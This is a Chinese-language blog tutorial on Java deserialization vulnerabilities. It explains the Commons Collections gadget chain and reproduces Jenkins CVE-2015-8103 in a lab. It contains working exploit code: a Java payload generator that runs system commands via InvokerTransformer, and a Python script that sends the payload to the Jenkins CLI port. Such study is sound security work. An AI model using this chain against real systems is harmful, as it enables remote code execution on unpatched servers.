---
title: Java反序列之从萌新到菜鸟
date: 2019-01-18 13:29:57
tags:
	- java
	- 反序列化
---

# 前言

距离上一次更新博客差不多已经过去一个月了，中间的事情确实也很多。最近勉强把Java的基础给补了，就来记录一下Java中最经典的反序列化漏洞。

# 序列化与反序列化

## 序列化

Java中并非所有的数据类型都可以进行序列化，想要进行序列化和反序列化的数据结构需要使用`Serializable`这样一个接口。例如下面这个类

```java
public class Employee implements Serializable {
    private String name;
    private String identify;
    
    // setter and getter
}
```

然后通过如下方式，就可以将一个类进行序列化，变成可持久化存储的二进制数据。

```java
public static void main(String[] args){
    Employee e = new Employee();
    try{
        FileOutputStream fileOut = new
            FileOutputStream("1.bin");
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        out.writeObject(e);
        out.close();
        fileOut.close();
        System.out.println("Serialized data is complete.");
    }catch (IOException i){
        i.printStackTrace();
    }
}
```

可以来看一下生成的序列化数据

![](Java反序列之从萌新到菜鸟\1.png)

- `0xaced`，魔术头
- `0x0005`，版本号 *（JDK主流版本一致，下文如无特殊标注，都以JDK8u为例）*

开头的几位一般来当作Java序列化字节的特征。

可以看到Java的序列化数据没有像PHP一样那么容易被人理解，是以一种字节码的形式进行保存的。

## 反序列化

```java
public static void main(String[] args){
    Employee e = null;
    try{
        FileInputStream fileIn = new FileInputStream("1.bin");
        ObjectInputStream in = new ObjectInputStream(fileIn);
        e = (Employee) in.readObject();
        in.close();
        fileIn.close();
    }catch(IOException i)
    {
        i.printStackTrace();
        return;
    }catch(ClassNotFoundException c)
    {
        System.out.println("Employee class not found");
        c.printStackTrace();
        return;
    }
    System.out.println(e.toString());
}
```

通过以上的方式，就可以将序列化后的字节码重新反序列化程程序中的类。

## SerialVersionUID

相比PHP中的反序列化，Java中做了更多的安全检测机制，例如`SerialVersionUID`

当类中没有自定义这个值的时候，会通过一系列的Hash算法自动生成这个值，详细的可以看https://xz.aliyun.com/t/3847#toc-3

简而言之就是当反序列化时的类与序列化时候的类“不一致”（例如类中的方法和原先的不一致）的时候，不会允许你进行反序列化。

![](Java反序列之从萌新到菜鸟\2.png)

# 反序列化的利用

## 相较PHP的一些利用

反序列化的主要攻击方式，就是控制类中的数据，然后带入到危险函数中进行攻击。

1、由于Java中不存在PHP中那么多的魔术方法，所以这一条路可以算是gg了。

2、其次由于`SerialVersionUID`的存在，不允许进行任意类的反序列化。而且通常在反序列化的时候都会进行一次类型转换，所以任意类的反序列化也变成了不可能。

![](Java反序列之从萌新到菜鸟\3.png)

3、然后就是当原先类的方法中存在危险函数，又正好在反序列化之后被调用了，就可以引发危害。但是感觉遇到的机会实属小。

![](Java反序列之从萌新到菜鸟\4.png)

4、然后就是Java中最常用的一种利用方式

可以观察到，在每个反序列化的过程中，都会调用`readObject()`这个方法

![](Java反序列之从萌新到菜鸟\5.png)

前辈大佬们就去寻找重写了这个方法的类，并配合`invoke`反射的机制，构造pop链，形成了Java中最具特色的反序列化攻击。

## CommonsCollections反序列化 

### transform()反射机制

> 以下内容摘自 https://security.tencent.com/index.php/blog/msg/97

> Commons Collections实现了一个`TransformedMap`类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由`Transformer`类定义，`Transformer`在`TransformedMap`实例化时作为参数传入。
>
> 我们可以通过`TransformedMap.decorate()`方法，获得一个`TransformedMap`的实例。

![](Java反序列之从萌新到菜鸟\6.png)

> 当`TransformedMap`内的key 或者 value发生变化时，就会触发相应的`Transformer`的`transform()`方法。另外，还可以使用`Transformer`数组构造成`ChainedTransformer`。当触发时，`ChainedTransformer`可以按顺序调用一系列的变换。而Apache Commons Collections已经内置了一些常用的`Transformer`，其中`InvokerTransformer`类就是今天的主角。
>
> 它的transform方法如下：

![](Java反序列之从萌新到菜鸟\7.png)

> 这个`transform(Object input)` 中使用Java反射机制调用了input对象的一个方法，而该方法名是实例化`InvokerTransformer`类时传入的`iMethodName`成员变量： 

![img](Java反序列之从萌新到菜鸟\8.png)

也就意味着，我们现在可以完全控制其中的反射部分

![](Java反序列之从萌新到菜鸟\9.png)

然后利用反射机制，动态调用其它类中的方法。通过以下的链式调用，就可以命令执行

```java
public static void main(String[] args) throws Exception{
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{
            String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{ Object.class,
                                                     Object[].class}, new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec", new Class[] {String.class},
                               new Object[]{"calc"})};

    Transformer transformedChain = new ChainedTransformer(transformers);

    Map normalMap = new HashMap();
    normalMap.put("value", "value");

    Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);

    Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();
    entry.setValue("test");
}
```

在最后重新set了Value的值之后，就触发了了`Transformer的transform()`方法 。

就相当于利用反射机制，链式执行了系统命令

![](Java反序列之从萌新到菜鸟\10.png)

可以在运行之后，就能看到弹出的计算器。

### AnnotationInvocationHandler 

然后需要找到一个重写了`readObject`方法，并且对其中的一个`Map`类型成员变量进行重新赋值的这样一个类。于是在`sun.reflect.annotation.AnnotationInvocationHandler`这样一个原生的包中，就存在这样一个类。

![](Java反序列之从萌新到菜鸟\11.png)

这样，我们就可以反序列化这个类，将其成员变量`memeberVaules`反序列化成之前的那个`TransformedMap `，利用反射机制，就可以命令执行。



# Jenkins 反序列化 CVE-2015-8103 

## 前提

在2015爆出的Commons Collections反序列化之后，众多厂商都躺枪，今天挑了一个`Jenkins`的反序列化，通过手工构造Payload的形式，复现当年的反序列化漏洞。

靶场环境: https://github.com/Medicean/VulApps/tree/master/j/jenkins/1

不过这个漏洞的端口并不是在应用的web端口，而是在Jenkins的CLI端口（一般是一个随机的大端口），在靶场里是固定的50000

## 流量分析

通过wireshare进行流量包的抓取之后，可以看到其中存在Java反序列化的特征值`ac ed 00 05 `的base64编码之后的值`rO0AB `

![](Java反序列之从萌新到菜鸟\12.png)

所以，只要我们模拟之前的TCP通信，并将这段base64编码的数据替换成我们恶意构造的序列化数据，就可以达成反序列化攻击。

## 构造Payload

生成序列化字节

```java
public static void main(String[] args) throws Exception{
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{
            String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{ Object.class,
                                                     Object[].class}, new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec", new Class[] {String.class},
                               new Object[]{"touch /tmp/eval"})};

    Transformer transformedChain = new ChainedTransformer(transformers);

    Map normalMap = new HashMap();
    normalMap.put("value", "value");

    Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);
    Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
    ctor.setAccessible(true);
    Object instance = ctor.newInstance(Target.class, transformedMap);

    File f = new File("eval.bin");
    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
    out.writeObject(instance);
}
```

然后用python进行socket通信

```python
#!/usr/bin/env python
# coding: utf-8

import sys
import base64
import socket
import hashlib
import time

host = sys.argv[1]
sock_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

cli_listener = (socket.gethostbyname(host), 50000)
print('[+] Connecting CLI listener %s:%s' % cli_listener)
sock_fd.connect(cli_listener)

print('[+] Sending handshake headers')
headers = '\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'
sock_fd.send(headers)
sock_fd.recv(1024)
sock_fd.recv(1024)

payload_obj_b64 = sys.argv[2]
payload = '\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e'
payload += payload_obj_b64

print('[+] Sending payload')
sock_fd.send(payload)
print('[+] Send All')
```

手动传入base64之后的数据

![](Java反序列之从萌新到菜鸟\13.png)

之后就可以在docker中看到/tmp目录下生成的`eval`文件

![](Java反序列之从萌新到菜鸟\14.png)

# 最后

亲手完成了这些反序列化的过程感觉还是可以的，以后实际构造payload时可以利用`ysoserial`这个工具，里面有很多已经构造好了的pop链，Java反序列化必备神器。

https://github.com/frohoff/ysoserial

感觉Java的漏洞需要的前置知识还是有蛮多的，比PHP的入门门槛要高一截。

最后，由于一些原因，以后博客可能也不能像之前更的那么勤快了。但会努力不让它太荒废的。

# Reference

https://xz.aliyun.com/t/3847

https://security.tencent.com/index.php/blog/msg/97

https://github.com/Medicean/VulApps/tree/master/j/jenkins/1